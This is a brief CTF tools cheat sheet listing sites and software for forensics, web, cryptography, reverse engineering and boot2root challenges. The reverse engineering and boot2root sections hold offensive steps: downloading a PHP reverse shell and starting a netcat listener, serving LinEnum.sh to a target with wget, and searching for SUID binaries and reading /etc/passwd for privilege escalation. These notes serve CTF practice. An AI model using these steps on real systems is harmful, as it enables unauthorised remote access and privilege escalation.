# CTF TOOLS GUIDE

beginner: [CTFtime.org](http://CTFtime.org), ctflearn, pwntilldawn

discord:hacker101 & htb

`git remote add origin <https://github.com/sovayle/`>

# Forensics

software: HxD, Autopsy, hexeditor(linux)

# Web Exploitation

gobuster
Catch http requests from a server: requestbin.com

# Cryptography

websites: [hashes.com](http://hashes.com), crackstation, cyberchef
hashes.com hash identifier

python3 hash identifier
`wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py`

`python3 hash-id.py`

hash-identifier 7bf6d9bb82bed1302f331fc6b816aada

gpg --help
gpg --import tryhackme.key
gpg message.gpg
cat message


# Reverse Engineering

![RE example.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/720f4b35-149f-42ac-924a-4db489bc5b3a/RE_example.png)

![RE example2.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/56c5f5e9-f997-4663-9b5d-e0d5b96a9d3b/RE_example2.png)

![RE example3.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6392dd19-8341-4097-880a-f4a2a8d9c73c/RE_example3.png)

wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

sudo nc -lvnp 1234
upload reverse shell script
profit

wget hash identifier website

Remmina for RDP


# Binary Exploitation

# OSINT

# Steganography

# boot2root
exploitdb scripts
gtfobins

sudo -l

priviledge escalation
Linenum
**python3 -m http.server 8000**
**"wget"** on the target machine, and your local IP, you can grab the file from your local machine [2].

wget 10.4.20.232:8000/LinEnum.sh

Then make the file executable using the command **"chmod +x FILENAME.sh"**.

/etc/passwd 
/etc/shells
/etc/crontab

finding SUID binaries:
**find / -perm -u=s -type f 2>/dev/null**


# Programming (Development challenges)